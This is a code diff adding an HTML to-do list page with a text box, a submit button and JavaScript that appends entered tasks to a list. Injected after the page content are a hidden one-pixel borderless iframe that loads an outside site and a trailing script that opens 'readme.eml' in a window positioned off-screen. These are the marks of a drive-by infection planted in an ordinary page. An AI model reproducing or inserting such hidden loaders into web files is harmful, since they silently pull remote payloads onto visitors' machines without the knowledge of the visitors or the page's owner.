@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>PreIntern Group</title>
+        <script>
+            function disbtn() {
+                var c=document.getElementById('submit');
+                if(txt.value != ''){
+                    c.disabled = false;
+
+                }
+                else{
+                    c.disabled = true;
+                }
+                
+                
+            }
+
+            function myBtn(){
+                var li = document.createElement('li');
+                var inputValue=document.getElementById('txt').value;
+                var t=document.createTextNode(inputValue);
+                li.appendChild(t);
+                if (inputValue ===''){
+                    document.getElementById('submit').disabled=false;
+                }
+                else{
+                    document.getElementById('list').appendChild(li);
+                }
+            }
+            
+        </script>
+    </head>
+    <body>
+        <h1>To Do List</h1>
+        <ul id="list">
+
+        </ul>
+        <input id="txt" placeholder="Add todo task" type="text" onkeyup="disbtn()">
+        <input type="submit" id="submit" onclick="myBtn()" disabled>
+    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
